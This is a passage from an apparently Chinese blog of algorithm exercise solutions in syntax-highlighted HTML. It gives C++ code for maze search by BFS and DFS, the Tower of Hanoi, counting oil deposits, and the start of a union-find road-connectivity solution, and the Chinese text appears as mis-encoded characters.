class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h, w;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; h &gt;&gt; w)&#123;</span><br><span class="line"><span class="keyword">if</span>(h==<span class="number">0</span> &amp;&amp; w==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(m, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(m));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sx, sy;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; h; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; w; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">sx = i;</span><br><span class="line">sy = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="built_in">bfs</span>(sx, sy);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>DFSä¹Ÿèƒ½è§£å†³ï¼Œé€’å½’ï¼Œæ—¶é—´å¾ˆæ…¢</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">char</span> m[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(step &gt;= ans) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(m[x][y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">ans = <span class="built_in">min</span>(ans, step);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>)&amp;&amp;vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">dfs</span>(nx, ny, step+<span class="number">1</span>);</span><br><span class="line">vis[nx][ny] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> w, h;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line"><span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> sx, sy;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j] == <span class="string">&#x27;S&#x27;</span>)&#123;</span><br><span class="line">sx = i;</span><br><span class="line">sy = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="number">0x7ffffff</span>;</span><br><span class="line"><span class="built_in">dfs</span>(sx, sy, <span class="number">0</span>);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="Hanoiå¡”é—®é¢˜"><a href="#Hanoiå¡”é—®é¢˜" class="headerlink" title="Hanoiå¡”é—®é¢˜"></a>Hanoiå¡”é—®é¢˜</h3><h5 id="é¢˜ç›®æè¿°-32"><a href="#é¢˜ç›®æè¿°-32" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>(né˜¶Hanoiå¡”é—®é¢˜ï¼‰å‡è®¾æœ‰ä¸‰ä¸ªåˆ†åˆ«å‘½åä¸ºAã€Bã€Cçš„å¡”åº§ï¼Œåœ¨å¡”åº§Aä¸Šæ’æœ‰n(n&lt;20)ä¸ªç›´å¾„å¤§å°å„ä¸ç›¸åŒã€ä¾å°åˆ°å¤§ç¼–å·ä¸º1ï¼Œ2ï¼Œâ€¦ï¼Œnçš„åœ†ç›˜ã€‚ç°è¦æ±‚å°†Aè½´ä¸Šçš„nä¸ªåœ†ç›˜ç§»è‡³å¡”åº§Cä¸Šå¹¶ä»æŒ‰åŒæ ·é¡ºåºå æ’ï¼Œåœ†ç›˜ç§»åŠ¨æ—¶å¿…é¡»éµå¾ªä¸‹åˆ—è§„åˆ™ï¼š 1ï¼‰æ¯æ¬¡åªèƒ½ç§»åŠ¨ä¸€ä¸ªåœ†ç›˜ï¼› 2ï¼‰åœ†ç›˜å¯ä»¥æ’åœ¨Aã€Bã€Cä¸­çš„ä»»ä¸€å¡”åº§ä¸Šï¼› 3ï¼‰ä»»ä½•æ—¶åˆ»éƒ½ä¸èƒ½å°†ä¸€ä¸ªè¾ƒå¤§çš„åœ†ç›˜å‹åœ¨è¾ƒå°çš„åœ†ç›˜ä¹‹ä¸Šã€‚ è¯·é€šè¿‡ç¼–ç¨‹æ¥æ‰“å°å‡ºç§»åŠ¨çš„æ­¥éª¤.</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-30"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-30" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-32"><a href="#è¾“å…¥æè¿°-32" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åªæœ‰ä¸€ç»„è¾“å…¥æ•°æ®.è¾“å…¥æ•°æ®<span class="built_in">N</span>(<span class="comment">;è¡¨ç¤ºåœ¨å¼€å§‹æ—¶Aå¡”åº§ä¸Šçš„ç›˜å­æ•°</span>),å½“è¾“å…¥<span class="number">0</span>æ—¶ç¨‹åºç»“æŸ.</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-32"><a href="#è¾“å‡ºæè¿°-32" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºç§»åŠ¨çš„æ­¥éª¤.å¦‚&quot;<span class="selector-tag">A</span>--&gt;C&quot;,&quot;<span class="selector-tag">A</span>--&gt;<span class="selector-tag">B</span>&quot;ç­‰.æ¯ä¸¤çš„æ­¥éª¤ä¹‹é—´æœ‰ä¸‰ä¸ªç©ºæ ¼éš”å¼€,æ¯è¾“å‡º<span class="number">5</span>ä¸ªæ­¥éª¤å°±æ¢è¡Œ.è¯¦ç»†çš„è§Sample Output.</span><br></pre></td></tr></table></figure><p>é€’å½’è§£å†³</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> jud = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hanoi</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> a, <span class="keyword">char</span> b, <span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>((jud+<span class="number">1</span>) % <span class="number">5</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c\n&quot;</span>, a, c);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%c--&gt;%c   &quot;</span>, a, c);</span><br><span class="line">jud++;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">hanoi</span>(n<span class="number">-1</span>, a, c, b);</span><br><span class="line"><span class="built_in">hanoi</span>(<span class="number">1</span>, a, b, c);</span><br><span class="line"><span class="built_in">hanoi</span>(n<span class="number">-1</span>, b, a, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">hanoi</span>(n, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="çŸ³æ²¹å‚¨è—"><a href="#çŸ³æ²¹å‚¨è—" class="headerlink" title="çŸ³æ²¹å‚¨è—"></a>çŸ³æ²¹å‚¨è—</h3><h5 id="é¢˜ç›®æè¿°-33"><a href="#é¢˜ç›®æè¿°-33" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æœ‰ä¸€ä¸ªGeoSurvCompåœ°è´¨å‹˜æ¢å…¬å¸æ­£åœ¨è´Ÿè´£æ¢æµ‹åœ°åº•ä¸‹çš„çŸ³æ²¹å—ã€‚è¿™ä¸ªå…¬å¸åœ¨ä¸€ä¸ªæ—¶åˆ»è°ƒæŸ¥ä¸€ä¸ªçŸ©å½¢åŒºåŸŸï¼Œå¹¶ä¸”åˆ›å»ºæˆä¸€ä¸ªä¸ªçš„æ ¼å­ç”¨æ¥è¡¨ç¤ºä¼—å¤šæ­£æ–¹å½¢å—ã€‚å®ƒç„¶åä½¿ç”¨æµ‹å®šè®¾å¤‡å•ä¸ªçš„åˆ†ææ¯å—åŒºåŸŸï¼Œå†³å®šæ˜¯å¦æœ‰çŸ³æ²¹ã€‚ä¸€å—æœ‰çŸ³æ²¹å°åŒºåŸŸè¢«ç§°ä¸ºä¸€ä¸ªpocketï¼Œå‡è®¾ä¸¤ä¸ªpocketæ˜¯ç›¸é‚»çš„ï¼Œç„¶åä»–ä»¬å°±æ˜¯ç›¸åŒçŸ³æ²¹å—çš„ä¸€éƒ¨åˆ†ï¼ŒçŸ³æ²¹å—å¯èƒ½éå¸¸çš„å¤§å¹¶ä¸”åŒ…æ¶µå¾ˆå¤šçš„pocketã€‚ä½ çš„ä»»åŠ¡å°±æ˜¯åœ¨ä¸€ä¸ªç½‘æ ¼ä¸­å­˜åœ¨å¤šå°‘ä¸ªçŸ³æ²¹å—ã€‚è¾“å…¥é¦–å…ˆç»™å‡ºå›¾çš„å¤§å°ï¼Œç„¶åç»™å‡ºè¿™ä¸ªå›¾ã€‚*ä»£è¡¨æ²¡æœ‰çŸ³æ²¹ï¼Œ@ä»£è¡¨å­˜åœ¨çŸ³æ²¹ã€‚è¾“å‡ºæ¯ç§æƒ…å†µä¸‹çŸ³æ²¹å—çš„ä¸ªæ•°ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-31"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-31" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-33"><a href="#è¾“å…¥æè¿°-33" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªç½‘æ ¼ã€‚ æ¯ä¸ªç½‘æ ¼éƒ½ä»¥åŒ…å«må’Œ<span class="built_in">n</span>çš„è¡Œå¼€å§‹ï¼Œç½‘æ ¼ä¸­çš„è¡Œå’Œåˆ—æ•°ä¸ºmå’Œ<span class="built_in">n</span>ï¼Œä»¥å•ä¸ªç©ºæ ¼åˆ†éš”ã€‚ å¦‚æœm = <span class="number">0</span>ï¼Œåˆ™è¡¨ç¤ºè¾“å…¥ç»“æŸã€‚ å¦åˆ™ä¸º<span class="number">1</span> &lt;= m &lt;= <span class="number">100</span>å’Œ<span class="number">1</span> &lt;= <span class="built_in">n</span> &lt;=<span class="number">100</span>ã€‚è¿™ä¹‹åæ˜¯mè¡Œï¼Œæ¯è¡Œ<span class="built_in">n</span>ä¸ªå­—ç¬¦ï¼ˆä¸è®¡ç®—è¡Œæœ«å­—ç¬¦ï¼‰ã€‚ æ¯ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªæƒ…èŠ‚ï¼Œè¦ä¹ˆæ˜¯ä»£è¡¨æ²¡æœ‰æ²¹çš„â€œ *â€ï¼Œè¦ä¹ˆæ˜¯ä»£è¡¨æ²¹å›Šçš„â€œ @â€ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-33"><a href="#è¾“å‡ºæè¿°-33" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">åœ¨æ°´å¹³ï¼Œå‚ç›´æˆ–å¯¹è§’çº¿ä¸Šéƒ½ç®—ä½œç›¸é‚»ï¼Œè¾“å‡ºæ¯ç§æƒ…å†µä¸‹çŸ³æ²¹å—çš„ä¸ªæ•°ã€‚</span><br></pre></td></tr></table></figure><p>dfs</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">char</span> m[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">8</span>][<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">vis[x][y] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> nx = x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ny = y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(m[nx][ny] == <span class="string">&#x27;@&#x27;</span> &amp;&amp; vis[nx][ny] == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">dfs</span>(nx, ny);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> w, h;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; w &gt;&gt; h)&#123;</span><br><span class="line"><span class="keyword">if</span>(w == <span class="number">0</span> &amp;&amp; h == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="built_in">memset</span>(m, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(m));</span><br><span class="line"><span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(vis));</span><br><span class="line"><span class="comment">//for(int i = 0; i &lt; 100; i++)&#123;</span></span><br><span class="line"><span class="comment">//for(int j = 0; j &lt; 100; j++)&#123;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; vis[i][j] &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line">cin &gt;&gt; m[i];</span><br><span class="line">&#125;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; w; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i][j]==<span class="string">&#x27;@&#x27;</span>&amp;&amp;vis[i][j] == <span class="number">0</span>)&#123;</span><br><span class="line">ans ++;</span><br><span class="line"><span class="built_in">dfs</span>(i, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="å›¾è®º"><a href="#å›¾è®º" class="headerlink" title="å›¾è®º"></a>å›¾è®º</h1><h3 id="ç•…é€šå·¥ç¨‹2"><a href="#ç•…é€šå·¥ç¨‹2" class="headerlink" title="ç•…é€šå·¥ç¨‹2"></a>ç•…é€šå·¥ç¨‹2</h3><h5 id="é¢˜ç›®æè¿°-34"><a href="#é¢˜ç›®æè¿°-34" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æŸçœè°ƒæŸ¥åŸé•‡äº¤é€šçŠ¶å†µï¼Œå¾—åˆ°ç°æœ‰åŸé•‡é“è·¯ç»Ÿè®¡è¡¨ï¼Œè¡¨ä¸­åˆ—å‡ºäº†æ¯æ¡é“è·¯ç›´æ¥è¿é€šçš„åŸé•‡ã€‚çœæ”¿åºœâ€œç•…é€šå·¥ç¨‹â€çš„ç›®æ ‡æ˜¯ä½¿å…¨çœä»»ä½•ä¸¤ä¸ªåŸé•‡é—´éƒ½å¯ä»¥å®ç°äº¤é€šï¼ˆä½†ä¸ä¸€å®šæœ‰ç›´æ¥çš„é“è·¯ç›¸è¿ï¼Œåªè¦äº’ç›¸é—´æ¥é€šè¿‡é“è·¯å¯è¾¾å³å¯ï¼‰ã€‚é—®æœ€å°‘è¿˜éœ€è¦å»ºè®¾å¤šå°‘æ¡é“è·¯ï¼Ÿ</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-32"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-32" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-34"><a href="#è¾“å…¥æè¿°-34" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•è¾“å…¥åŒ…å«è‹¥å¹²æµ‹è¯•ç”¨ä¾‹ã€‚æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹çš„ç¬¬1è¡Œç»™å‡ºä¸¤ä¸ªæ­£æ•´æ•°ï¼Œåˆ†åˆ«æ˜¯åŸé•‡æ•°ç›®N ( &lt;<span class="number"> 1000 </span>)å’Œé“è·¯æ•°ç›®Mï¼›éšåçš„Mè¡Œå¯¹åº”Mæ¡é“è·¯ï¼Œæ¯è¡Œç»™å‡ºä¸€å¯¹æ­£æ•´æ•°ï¼Œåˆ†åˆ«æ˜¯è¯¥æ¡é“è·¯ç›´æ¥è¿é€šçš„ä¸¤ä¸ªåŸé•‡çš„ç¼–å·ã€‚ä¸ºç®€å•èµ·è§ï¼ŒåŸé•‡ä»1åˆ°Nç¼–å·ã€‚ </span><br><span class="line">    æ³¨æ„:ä¸¤ä¸ªåŸå¸‚ä¹‹é—´å¯ä»¥æœ‰å¤šæ¡é“è·¯ç›¸é€š,ä¹Ÿå°±æ˜¯è¯´</span><br><span class="line">   <span class="number"> 3 </span>3</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 1 </span>2</span><br><span class="line">   <span class="number"> 2 </span>1</span><br><span class="line">    è¿™ç§è¾“å…¥ä¹Ÿæ˜¯åˆæ³•çš„</span><br><span class="line">    å½“Nä¸º0æ—¶ï¼Œè¾“å…¥ç»“æŸï¼Œè¯¥ç”¨ä¾‹ä¸è¢«å¤„ç†ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-34"><a href="#è¾“å‡ºæè¿°-34" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œåœ¨1è¡Œé‡Œè¾“å‡ºæœ€å°‘è¿˜éœ€è¦å»ºè®¾çš„é“è·¯æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><p>å¹¶æŸ¥é›†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1000</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn], rank[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initial</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">f[i] = i;</span><br><span class="line">rank[i] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == f[x]) <span class="keyword">return</span> x;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[x] = <span class="built_in">find</span>(f[x]);</span><br><span class="line"><span class="keyword">return</span> f[x];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> 